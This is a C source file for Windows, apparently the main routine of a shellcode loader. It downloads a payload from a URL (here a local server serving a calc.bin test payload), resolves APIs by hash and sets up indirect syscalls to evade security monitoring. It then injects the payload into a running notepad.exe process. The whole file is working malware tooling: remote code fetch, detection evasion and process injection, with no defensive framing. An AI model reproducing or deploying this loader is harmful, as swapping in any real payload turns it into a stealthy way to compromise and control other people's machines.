#include <windows.h>
#include <stdio.h>

#include "Structs.h"
#include "Common.h"
#include "Debug.h"

#define PAYLOAD L"http://127.0.0.1:8000/calc.bin"
#define PROC L"notepad.exe"

extern API_HASHING g_Api;

float _fltused = 0;

#define DEBUG


int main() {

    PBYTE pBytes = 0;
    SIZE_T sBytesSize = 0;
    DWORD PID = 0;
    HANDLE hProcess = NULL;
    HMODULE hNTDLL = NULL;

 

    PRINTA("getting payload from url...\n")
    if (!GetPayloadFromUrl(PAYLOAD, &pBytes, &sBytesSize)) {
        return -1;
    }

    PRINTA("Starting Get Module...\n\n");
    hNTDLL = GetMod(NTDLLDLL_DJB2);
    g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
    indirectMyAss(NtAllocateVirtualMemory_DJB2, hNTDLL, &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
    indirectMyAss(NtCreateThreadEx_DJB2, hNTDLL, &NtCreateThreadSSN, &NtCreateThreadSyscall);
    indirectMyAss(NtWriteVirtualMemory_DJB2, hNTDLL, &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
    indirectMyAss(NtWaitForSingleObject_DJB2, hNTDLL, &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
    indirectMyAss(NtClose_DJB2, hNTDLL, &NtCloseSSN, &NtCloseSyscall);
    indirectMyAss(NtOpenProcess_DJB2, hNTDLL, &NtOpenProcessSSN, &NtOpenProcessSyscall);
    indirectMyAss(NtQuerySystemInformation_DJB2, hNTDLL, &NtQuerySystemInformationSSN, &NtQuerySystemInformationSyscall);


    PRINTA("running GetRemoteProcessHandle...\n\n");
    if (!GetRemoteProcessHandle(PROC, &PID, &hProcess)) {
        return -1;
    }



    if (!injectMyAss(hProcess, PID, pBytes, sBytesSize)) {
        return -1;
    }


    return 0;
}